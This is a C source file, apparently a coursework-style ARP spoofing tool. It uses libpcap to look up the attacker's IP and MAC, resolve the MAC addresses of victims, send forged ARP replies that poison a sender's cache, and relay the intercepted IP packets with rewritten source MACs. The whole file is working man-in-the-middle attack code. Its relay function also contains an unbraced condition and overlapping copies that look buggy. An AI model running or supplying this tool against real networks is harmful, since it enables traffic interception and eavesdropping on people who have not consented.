#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <errno.h>
#include <arpa/inet.h>
#include <pcap.h>

#include "module.h"
#include "pcap.h"

uint8_t NULLADDR[IP_ADDR_LEN] = {0, 0, 0, 0};
uint8_t BROADCAST[ETHER_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void printIPAddress(const char * msg, uint8_t * ip) {
    printf("[+] %s : %u.%u.%u.%u\n", msg, ip[0], ip[1], ip[2], ip[3]);
}

void printMacAddress(const char * msg, uint8_t * mac) {
    if(mac == NULL)
        printf("[-] Cannot get %s\n", msg);
    else
        printf("[+] %s : %02x:%02x:%02x:%02x:%02x:%02x\n", msg, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

bool cmpIPAddress(uint8_t * a, uint8_t * b) {
    for(int i = 0; i < IP_ADDR_LEN; i++) {
        if(a[i] != b[i]) return false;
    }
    return true;
}

bool cmpMacAddress(uint8_t * a, uint8_t * b) {
    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
        if(a[i] != b[i]) return false;
    }
    return true;
}

int parseIP(uint8_t * ip, char * ip_str) {
    char * token = strtok(ip_str, ".");

    int i;
    for(i = 0; token != NULL; i++) {
        ip[i] = atoi(token);
        token = strtok(NULL, ".");
    }

    if(i == IP_ADDR_LEN)
        return SUCCESS;
    else 
        return FAIL;
}

int getAttackerIPAddress(char * ip_str, char * dev) {
    int fd;
    struct ifreq ifr;
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", dev);
    ioctl(fd, SIOCGIFADDR, &ifr);
    memcpy(ip_str, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4 * IP_ADDR_LEN);

    close(fd);

    return SUCCESS;
}

int getAttackerMacAddress(uint8_t * mac, char * dev) {
    struct ifaddrs *if_addrs = NULL;
    struct ifaddrs *if_addr = NULL;

    if (0 == getifaddrs(&if_addrs)) {    
        for (if_addr = if_addrs; if_addr != NULL; if_addr = if_addr->ifa_next) {
            if(!strcmp(dev, if_addr->ifa_name)) {
                // printf("name : %s\n", if_addr->ifa_name);

                // MAC address
                if (if_addr->ifa_addr != NULL && if_addr->ifa_addr->sa_family == AF_LINK) {
                    struct sockaddr_dl* sdl = (struct sockaddr_dl *)if_addr->ifa_addr;
                    if (ETHER_ADDR_LEN == sdl->sdl_alen) {
                        memcpy(mac, LLADDR(sdl), sdl->sdl_alen);
                        // printf("mac  : %02x:%02x:%02x:%02x:%02x:%02x\n\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                        freeifaddrs(if_addrs);
                        if_addrs = NULL;
                        return SUCCESS;
                    }
                }
            }
        }
    } 
    else {
        printf("getifaddrs() failed with errno =  %i %s\n", errno, strerror(errno));
    }
    return FAIL;
}

int getMacAddress(pcap_t * handle, uint8_t * ret, uint8_t * src_mac, uint8_t * src_ip, uint8_t * des_ip) {
    sendArpPacket(handle, src_mac, BROADCAST, src_ip, des_ip, 1);

    int cnt = 100;
    while (cnt--) {
        struct pcap_pkthdr * header;
        const u_char * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct arp_packet * arp_pkt = (struct arp_packet *)packet;
        bool check = arp_pkt && ntohs(arp_pkt -> arp_hdr.ea_hdr.ar_op) == 2 
            && cmpIPAddress(arp_pkt -> arp_hdr.arp_spa, des_ip) 
            && cmpIPAddress(arp_pkt -> arp_hdr.arp_tpa, src_ip);
        if(check) {
            memcpy(ret, arp_pkt -> arp_hdr.arp_sha, ETHER_ADDR_LEN);
            return SUCCESS;
        }
    }

    printf("[-] There isn't reply packet.\n");
    return FAIL;
}


void sendArpPacket(pcap_t * handle, uint8_t * src_mac, uint8_t * des_mac, uint8_t * src_ip, uint8_t * des_ip, int opcode = 1) {
    struct arp_packet * arp_pkt = (struct arp_packet *)malloc(sizeof(struct arp_packet));

    memcpy(arp_pkt -> eth_hdr.ether_shost, src_mac, ETHER_ADDR_LEN);
    memcpy(arp_pkt -> eth_hdr.ether_dhost, des_mac, ETHER_ADDR_LEN);
    arp_pkt -> eth_hdr.ether_type = htons(ETHERTYPE_ARP);
    
    arp_pkt -> arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_pkt -> arp_hdr.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_pkt -> arp_hdr.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_pkt -> arp_hdr.ea_hdr.ar_pln = 4;
    arp_pkt -> arp_hdr.ea_hdr.ar_op = htons(opcode);

    memcpy(arp_pkt -> arp_hdr.arp_sha, src_mac, ETHER_ADDR_LEN);
    memcpy(arp_pkt -> arp_hdr.arp_spa, src_ip, IP_ADDR_LEN);
    memcpy(arp_pkt -> arp_hdr.arp_tha, des_mac, ETHER_ADDR_LEN);
    memcpy(arp_pkt -> arp_hdr.arp_tpa, des_ip, IP_ADDR_LEN);

    pcap_sendpacket(handle, (u_char *)arp_pkt, sizeof(struct arp_packet));
    
    free(arp_pkt);

    printf("\n[+] Send ARP Packet! \n");
}

void afterHack(pcap_t * handle, uint8_t * atk_mac, uint8_t * trg_mac, uint8_t * sdr_mac, uint8_t * trg_ip, uint8_t * sdr_ip) {
    struct pcap_pkthdr * header;
    const u_char * packet;

    int res = pcap_next_ex(handle, &header, &packet);
    if (res <= 0) return;

    struct ether_header * ether_pkt = (struct ether_header *)packet;
    if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
        struct arp_packet * arp_pkt = (struct arp_packet *)packet;

        if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sdr_mac) && cmpMacAddress(arp_pkt -> arp_hdr.arp_tha, trg_mac)) {
            sendArpPacket(handle, atk_mac, sdr_mac, trg_ip, sdr_ip, 2);
        }
    }
    else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
        struct ip_packet * ip_pkt = (struct ip_packet *)packet;
        u_char * send_packet = (u_char *)malloc(header -> caplen);

        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sdr_mac) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, atk_mac))
        memcpy(ip_pkt -> eth_hdr.ether_shost, atk_mac, ETHER_ADDR_LEN);
        memcpy(send_packet, packet, header -> caplen);
        memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));

        printf("\n[+] Send Relay Packet!\n");
        printMacAddress("  Old Src MAC", sdr_mac);
        printMacAddress("  New Src MAC", atk_mac);
        printMacAddress("  Dst MAC", trg_mac);
        printIPAddress("  Target IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_dst));
        pcap_sendpacket(handle, send_packet, header -> caplen);

        free(send_packet);
    }
}